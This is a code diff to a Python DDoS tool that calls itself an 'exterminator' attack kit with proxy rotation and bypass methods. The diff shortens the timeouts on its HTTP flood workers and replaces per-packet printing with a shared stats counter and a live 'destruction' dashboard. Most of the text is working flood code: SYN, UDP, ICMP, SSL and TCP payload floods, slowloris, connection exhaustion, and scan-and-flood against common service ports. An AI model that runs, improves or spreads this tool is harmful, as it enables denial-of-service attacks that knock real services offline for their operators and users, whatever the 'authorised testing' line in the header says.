@@ -2,10 +2,10 @@
 """
     ┌─────────────────────────────────────────────────┐
     │   LAYER 7 & LAYER 4 DDOS TOOL                   │
-    │   WITH EXTERMINATOR METHODS & MAX RPS           │
+    │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
     │   SPRAY YOUR PAYLOAD IN MY PORT !                │
     └─────────────────────────────────────────────────┘
-    Author: bob (exterminator integration)
+    Author: bob (exterminator-style L4, max power L7)
     Legal: For authorised testing only.
 """
 
@@ -186,7 +186,7 @@ ALL_L7_METHODS = sorted(list(set(
     method for plan in PLANS.values() for method in plan['methods']
 )))
 
-# Layer 4 methods (including exterminator methods)
+# Layer 4 methods
 LAYER4_METHODS = [
     'TCP SYN FLOOD',
     'UDP FLOOD',
@@ -389,9 +389,6 @@ proxy_lock = asyncio.Lock()        # to safely update proxy lists
 last_proxy_refresh = 0
 PROXY_REFRESH_INTERVAL = 300       # seconds
 
-# Lock for printing Layer 4 activity lines
-print_lock = threading.Lock()
-
 def parse_proxy_line(line):
     """Parse a proxy line which can be:
        - ip:port
@@ -591,10 +588,10 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
             
             # Perform request based on method
             if method == 'HTTP GET':
-                async with session.get(request_url.replace('https://', 'http://'), headers=headers, timeout=10, proxy=proxy) as resp:
+                async with session.get(request_url.replace('https://', 'http://'), headers=headers, timeout=5, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'HTTPS GET':
-                async with session.get(request_url if request_url.startswith('https') else request_url.replace('http://', 'https://'), headers=headers, timeout=10, proxy=proxy) as resp:
+                async with session.get(request_url if request_url.startswith('https') else request_url.replace('http://', 'https://'), headers=headers, timeout=5, proxy=proxy) as resp:
                     await resp.read()
             elif method in ['HTTP POST', 'HTTPS POST', 'BYPASS-POST']:
                 post_url = request_url
@@ -604,35 +601,35 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
                 if method == 'BYPASS-POST':
                     data['rand'] = random.randint(1,1000000)
                     data['session'] = ''.join(random.choices('abcdef0123456789', k=16))
-                async with session.post(post_url, headers=headers, json=data, timeout=10, proxy=proxy) as resp:
+                async with session.post(post_url, headers=headers, json=data, timeout=5, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'CURL':
-                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'GET/POST MIX':
                 if random.random() > 0.5:
-                    async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
                         await resp.read()
                 else:
                     data = {'test': 'data', 'worker_id': worker_id}
-                    async with session.post(request_url, headers=headers, json=data, timeout=10, proxy=proxy) as resp:
+                    async with session.post(request_url, headers=headers, json=data, timeout=5, proxy=proxy) as resp:
                         await resp.read()
             elif method in ['BROWSER', 'HULK']:
-                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'DNS-AMP':
-                async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
                     await resp.read()
             elif method == 'STRESS TEST':
                 for _ in range(50):
-                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'TLS-VIP':
                 for _ in range(5):
-                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
@@ -640,30 +637,30 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
             elif method == 'CONCURRENT HOLD':
                 for _ in range(99):
                     if random.random() > 0.5:
-                        async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
+                        async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
                             await resp.read()
                     else:
-                        async with session.post(request_url, headers=headers, json={'data': 'test'}, timeout=8, proxy=proxy) as resp:
+                        async with session.post(request_url, headers=headers, json={'data': 'test'}, timeout=5, proxy=proxy) as resp:
                             await resp.read()
                     req_counter.value += 1
                     status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'SOCKET-AMP':
                 for _ in range(5):
-                    async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'NET-BYPASS':
                 for _ in range(100):
-                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
+                    async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
                         await resp.read()
                         req_counter.value += 1
                         status_dict[resp.status] = status_dict.get(resp.status, 0) + 1
                 continue
             elif method == 'BYPASS-GET':
-                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
+                async with session.get(request_url, headers=headers, timeout=5, proxy=proxy) as resp:
                     await resp.read()
             # For all single-request methods, update stats
             latency = time.perf_counter() - start
@@ -755,16 +752,23 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_cou
             p.join()
 
 # ================== LAYER 4 WORKERS (Exterminator style) ==================
-# Each worker prints a line per packet with random hex ID.
+# Each worker updates stats, no per-packet printing.
+class ExterminatorStats:
+    def __init__(self):
+        self.sent = 0
+        self.success = 0
+        self.connections = 0
+        self.ports_hit = set()
+        self.start_time = time.time()
+        self.lock = threading.Lock()
 
-def nuclear_port_5000_worker(target_ip, worker_id, end_time):
+def nuclear_port_5000_worker(target_ip, worker_id, end_time, stats):
     """Flood port 5000 with massive payloads."""
     while time.time() < end_time:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(2)
             sock.connect((target_ip, 5000))
-            # Send large payloads
             payloads = [
                 b'A' * 65535,
                 os.urandom(65535),
@@ -774,16 +778,18 @@ def nuclear_port_5000_worker(target_ip, worker_id, end_time):
             for payload in payloads:
                 try:
                     sock.send(payload)
-                    with print_lock:
-                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                        print(f"[NUCLEAR5000] {target_ip}:5000 HEXID:{hex_id}")
+                    with stats.lock:
+                        stats.sent += 1
+                        stats.success += 1
+                        stats.ports_hit.add(5000)
                 except:
                     break
             sock.close()
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-def nuclear_port_3000_worker(target_ip, worker_id, end_time):
+def nuclear_port_3000_worker(target_ip, worker_id, end_time, stats):
     """Flood port 3000 with massive payloads."""
     while time.time() < end_time:
         try:
@@ -800,16 +806,18 @@ def nuclear_port_3000_worker(target_ip, worker_id, end_time):
             for payload in payloads:
                 try:
                     sock.send(payload)
-                    with print_lock:
-                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                        print(f"[NUCLEAR3000] {target_ip}:3000 HEXID:{hex_id}")
+                    with stats.lock:
+                        stats.sent += 1
+                        stats.success += 1
+                        stats.ports_hit.add(3000)
                 except:
                     break
             sock.close()
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-def port_80_apocalypse_worker(target_ip, worker_id, end_time):
+def port_80_apocalypse_worker(target_ip, worker_id, end_time, stats):
     """HTTP floods on port 80."""
     while time.time() < end_time:
         try:
@@ -826,16 +834,18 @@ def port_80_apocalypse_worker(target_ip, worker_id, end_time):
             for req in crash_requests:
                 try:
                     sock.send(req)
-                    with print_lock:
-                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                        print(f"[PORT80] {target_ip}:80 HEXID:{hex_id}")
+                    with stats.lock:
+                        stats.sent += 1
+                        stats.success += 1
+                        stats.ports_hit.add(80)
                 except:
                     break
             sock.close()
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-def ssl_exterminator_worker(target_ip, worker_id, end_time):
+def ssl_exterminator_worker(target_ip, worker_id, end_time, stats):
     """SSL/TLS connection floods on port 443."""
     context = ssl.create_default_context()
     context.check_hostname = False
@@ -849,16 +859,18 @@ def ssl_exterminator_worker(target_ip, worker_id, end_time):
             for i in range(10):
                 try:
                     ssl_sock.send(os.urandom(8192))
-                    with print_lock:
-                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                        print(f"[SSL] {target_ip}:443 HEXID:{hex_id}")
+                    with stats.lock:
+                        stats.sent += 1
+                        stats.success += 1
+                        stats.ports_hit.add(443)
                 except:
                     break
             ssl_sock.close()
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-def udp_exterminator_worker(target_ip, worker_id, end_time):
+def udp_exterminator_worker(target_ip, worker_id, end_time, stats):
     """UDP packet storm to multiple critical ports."""
     critical_ports = [5000, 3000, 80, 443, 8080, 8443, 22, 21, 53, 3306, 5432, 27017]
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -868,13 +880,15 @@ def udp_exterminator_worker(target_ip, worker_id, end_time):
                 for i in range(10):
                     payload = os.urandom(1472)
                     sock.sendto(payload, (target_ip, port))
-                    with print_lock:
-                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                        print(f"[UDP-EX] {target_ip}:{port} HEXID:{hex_id}")
+                    with stats.lock:
+                        stats.sent += 1
+                        stats.success += 1
+                        stats.ports_hit.add(port)
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-def connection_exterminator_worker(target_ip, worker_id, end_time):
+def connection_exterminator_worker(target_ip, worker_id, end_time, stats):
     """Open and hold many TCP connections."""
     connections = []
     while time.time() < end_time:
@@ -885,15 +899,16 @@ def connection_exterminator_worker(target_ip, worker_id, end_time):
                     sock.settimeout(30)
                     sock.connect((target_ip, port))
                     connections.append(sock)
-                    with print_lock:
-                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                        print(f"[CONN-EX] {target_ip}:{port} HEXID:{hex_id}")
-            # Keep alive
+                    with stats.lock:
+                        stats.connections += 1
+                        stats.success += 1
+                        stats.ports_hit.add(port)
             time.sleep(0.5)
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-def port_scan_exterminator_worker(target_ip, worker_id, end_time):
+def port_scan_exterminator_worker(target_ip, worker_id, end_time, stats):
     """Scan for open ports and flood them."""
     all_ports = list(range(1, 1001))
     while time.time() < end_time:
@@ -908,16 +923,20 @@ def port_scan_exterminator_worker(target_ip, worker_id, end_time):
                     for i in range(10):
                         try:
                             sock.send(os.urandom(1024))
-                            with print_lock:
-                                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                                print(f"[SCAN-EX] {target_ip}:{port} HEXID:{hex_id}")
+                            with stats.lock:
+                                stats.sent += 1
+                                stats.success += 1
+                                stats.ports_hit.add(port)
                         except:
                             break
                 sock.close()
+                with stats.lock:
+                    stats.sent += 1
             except:
-                pass
+                with stats.lock:
+                    stats.sent += 1
 
-def slowloris_exterminator_worker(target_ip, worker_id, end_time):
+def slowloris_exterminator_worker(target_ip, worker_id, end_time, stats):
     """Slowloris on ports 5000 and 3000."""
     slowloris_connections = []
     while time.time() < end_time:
@@ -929,15 +948,16 @@ def slowloris_exterminator_worker(target_ip, worker_id, end_time):
                 partial = f"GET /{os.urandom(100).hex()} HTTP/1.1\r\nHost: {target_ip}\r\n".encode()
                 sock.send(partial)
                 slowloris_connections.append(sock)
-                with print_lock:
-                    hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                    print(f"[SLOW-EX] {target_ip}:{port} HEXID:{hex_id}")
+                with stats.lock:
+                    stats.connections += 1
+                    stats.ports_hit.add(port)
             time.sleep(5)
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-# Original Layer 4 workers (kept for compatibility)
-def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time):
+# Original Layer 4 workers (updated to use stats object)
+def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time, stats):
     if not HAS_SCAPY:
         return
     from scapy.all import IP, TCP, send
@@ -947,25 +967,29 @@ def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time):
             sport = random.randint(1024, 65535)
             packet = ip / TCP(sport=sport, dport=target_port, flags="S")
             send(packet, verbose=False)
-            with print_lock:
-                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"[SYN] {target_ip}:{target_port} HEXID:{hex_id}")
+            with stats.lock:
+                stats.sent += 1
+                stats.success += 1
+                stats.ports_hit.add(target_port)
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-def udp_flood_worker(target_ip, target_port, worker_id, end_time):
+def udp_flood_worker(target_ip, target_port, worker_id, end_time, stats):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while time.time() < end_time:
         try:
             payload = os.urandom(random.randint(1024, 1472))
             sock.sendto(payload, (target_ip, target_port))
-            with print_lock:
-                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"[UDP] {target_ip}:{target_port} HEXID:{hex_id}")
+            with stats.lock:
+                stats.sent += 1
+                stats.success += 1
+                stats.ports_hit.add(target_port)
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-def icmp_flood_worker(target_ip, worker_id, end_time):
+def icmp_flood_worker(target_ip, worker_id, end_time, stats):
     if not HAS_SCAPY:
         return
     from scapy.all import IP, ICMP, send
@@ -974,13 +998,14 @@ def icmp_flood_worker(target_ip, worker_id, end_time):
         try:
             packet = ip / ICMP()
             send(packet, verbose=False)
-            with print_lock:
-                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"[ICMP] {target_ip} HEXID:{hex_id}")
+            with stats.lock:
+                stats.sent += 1
+                stats.success += 1
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-def slowloris_worker(target_ip, target_port, worker_id, end_time):
+def slowloris_worker(target_ip, target_port, worker_id, end_time, stats):
     socks = []
     while time.time() < end_time:
         try:
@@ -990,37 +1015,40 @@ def slowloris_worker(target_ip, target_port, worker_id, end_time):
             partial = f"GET /{os.urandom(16).hex()} HTTP/1.1\r\nHost: {target_ip}\r\n".encode()
             sock.send(partial)
             socks.append(sock)
-            with print_lock:
-                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"[SLOWLORIS] {target_ip}:{target_port} HEXID:{hex_id}")
+            with stats.lock:
+                stats.connections += 1
+                stats.success += 1
+                stats.ports_hit.add(target_port)
             time.sleep(5)
             for s in socks[-50:]:
                 try:
                     s.send(b"X-a: b\r\n")
-                    with print_lock:
-                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                        print(f"[SLOWLORIS] {target_ip}:{target_port} HEXID:{hex_id}")
+                    with stats.lock:
+                        stats.sent += 1
+                        stats.success += 1
                 except:
                     pass
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
         time.sleep(0.1)
 
-def connection_exhaustion_worker(target_ip, target_port, worker_id, end_time):
+def connection_exhaustion_worker(target_ip, target_port, worker_id, end_time, stats):
     while time.time() < end_time:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(30)
             sock.connect((target_ip, target_port))
-            with print_lock:
-                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"[CONNEX] {target_ip}:{target_port} HEXID:{hex_id}")
+            with stats.lock:
+                stats.connections += 1
+                stats.ports_hit.add(target_port)
             time.sleep(10)
             sock.close()
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
-def port_scan_worker(target_ip, worker_id, end_time):
+def port_scan_worker(target_ip, worker_id, end_time, stats):
     ports_to_scan = list(range(1, 1025))
     random.shuffle(ports_to_scan)
     for port in ports_to_scan:
@@ -1034,17 +1062,21 @@ def port_scan_worker(target_ip, worker_id, end_time):
                 for _ in range(10):
                     try:
                         sock.send(os.urandom(1024))
-                        with print_lock:
-                            hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                            print(f"[PORTSCAN] {target_ip}:{port} HEXID:{hex_id}")
+                        with stats.lock:
+                            stats.sent += 1
+                            stats.success += 1
+                            stats.ports_hit.add(port)
                     except:
                         break
             sock.close()
+            with stats.lock:
+                stats.sent += 1
         except:
-            pass
+            with stats.lock:
+                stats.sent += 1
 
 async def run_layer4_attack(target_ip, method, workers, duration, plan_name):
-    """Run Layer 4 attack using thread pool."""
+    """Run Layer 4 attack using thread pool (exterminator style)."""
     target_ports = []
     # Determine if method requires port input
     if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
@@ -1091,6 +1123,7 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name):
         print("  Unknown Layer 4 method.")
         return
     
+    stats = ExterminatorStats()
     end_time = time.time() + duration
     
     def worker_wrapper(worker_id):
@@ -1100,20 +1133,65 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name):
                 port = random.choice(target_ports) if target_ports else None
                 # For methods that need a port
                 if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
-                    worker_func(target_ip, port, worker_id, end_time)
+                    worker_func(target_ip, port, worker_id, end_time, stats)
                 else:
                     # Methods that don't need a port (ICMP, port scan, exterminator methods)
-                    worker_func(target_ip, worker_id, end_time)
+                    worker_func(target_ip, worker_id, end_time, stats)
             else:
                 # No ports needed
-                worker_func(target_ip, worker_id, end_time)
+                worker_func(target_ip, worker_id, end_time, stats)
     
     with ThreadPoolExecutor(max_workers=workers) as executor:
         futures = [executor.submit(worker_wrapper, i) for i in range(workers)]
-        # Wait for all threads to finish (they will exit when end_time is reached)
-        for f in futures:
-            f.result()
-        print(f"\n{current_color}Attack finished.{RESET}")
+        
+        # Stats display loop (like exterminator.py)
+        try:
+            while time.time() < end_time:
+                elapsed = time.time() - stats.start_time
+                remaining = max(0, duration - elapsed)
+                rps = stats.sent / elapsed if elapsed > 0 else 0
+                
+                clear_screen()
+                print(f"{current_color}{BOLD}💀 EXTERMINATOR ATTACK - {duration} SECOND DESTRUCTION{RESET}")
+                print("="*70)
+                print(f"🎯 Target: {target_ip}")
+                print(f"⏱️  Time Elapsed: {elapsed:.1f}s")
+                print(f"⏰ Time Remaining: {remaining:.1f}s")
+                print(f"📊 Packets Sent: {stats.sent:,}")
+                print(f"✅ Successful Attacks: {stats.success:,}")
+                print(f"🔗 Active Connections: {stats.connections:,}")
+                print(f"🎯 Ports Hit: {len(stats.ports_hit)}")
+                print(f"🚀 PPS: {rps:,.1f}")
+                print("="*70)
+                print("EXTERMINATION METHODS:")
+                print("• Port 5000 Nuclear • Port 3000 Nuclear • Port 80 Apocalypse")
+                print("• SSL Extermination • UDP Storm • Connection Exhaustion")
+                print("• Port Scanning • Slowloris Attacks")
+                print("="*70)
+                await asyncio.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n\n{current_color}attack interrupted.{RESET}")
+        finally:
+            # Wait for threads to finish
+            for f in futures:
+                f.cancel()
+    
+    # Final stats
+    elapsed = time.time() - stats.start_time
+    rps = stats.sent / elapsed if elapsed > 0 else 0
+    print("\n" + "="*70)
+    print(f"{current_color}{BOLD}💀 EXTERMINATION COMPLETE{RESET}")
+    print("="*70)
+    print(f"⏱️  Total Time: {elapsed:.1f}s")
+    print(f"📊 Total Packets: {stats.sent:,}")
+    print(f"✅ Successful Attacks: {stats.success:,}")
+    print(f"🔗 Max Connections: {stats.connections:,}")
+    print(f"🎯 Ports Attacked: {len(stats.ports_hit)}")
+    if stats.ports_hit:
+        print(f"🎯 Ports Hit: {sorted(stats.ports_hit)}")
+    print(f"🚀 Average PPS: {rps:,.1f}")
+    print("="*70)
+    input(f"\n  Press ENTER to return...")
 
 # ================== METHOD SELECTION ==================
 def select_method():
@@ -1258,19 +1336,13 @@ async def run_load_test(req_counter, err_counter, status_dict, latency_list, por
     elapsed = time.time() - stats_start_time
     reqs = req_counter.value
     errs = err_counter.value
-    print(f"\n{current_color}{BOLD}╔══ ATTACK OVER ══╗{RESET}")
-    if is_layer4:
-        print(f"  Total Packets: {reqs:,}")
-        print(f"  Total Errors: {errs:,}")
-        print(f"  Duration: {elapsed:.1f}s")
-        print(f"  Average PPS: {reqs/elapsed:.2f}")
-    else:
+    if not is_layer4:
+        print(f"\n{current_color}{BOLD}╔══ ATTACK OVER ══╗{RESET}")
         print(f"  Total Requests: {reqs:,}")
         print(f"  Total Errors: {errs:,}")
         print(f"  Duration: {elapsed:.1f}s")
         print(f"  Average RPS: {reqs/elapsed:.2f}")
-    
-    input(f"\n  Press ENTER to return...")
+        input(f"\n  Press ENTER to return...")
 
 # ================== RECONNAISSANCE ==================
 def scan_port(target_ip, port, timeout=1):
